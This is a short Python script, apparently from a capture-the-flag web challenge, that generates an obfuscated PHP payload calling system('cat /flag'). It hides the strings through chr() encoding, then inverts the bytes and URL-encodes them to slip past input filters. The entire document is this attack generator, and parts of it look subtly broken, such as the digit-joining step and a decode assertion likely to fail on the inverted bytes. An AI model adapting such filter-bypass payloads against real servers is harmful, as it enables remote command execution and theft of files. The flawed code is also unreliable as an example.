def enc_str(s):
	parts = ['\x0dchr(~ ~%s|$z)[0]' % '_'.join(str(ord(c))) for c in s]
	return '.@'.join(parts)

payload = '$a=~ ~' + enc_str('system') + ';@$a(~ ~' + enc_str('cat /flag') + ')|$z;{ }'
print(payload)
invert_payload = bytes([x ^ 0xFF for x in payload.encode()])
assert invert_payload.decode()
print(''.join('%%%02x' % q for q in invert_payload))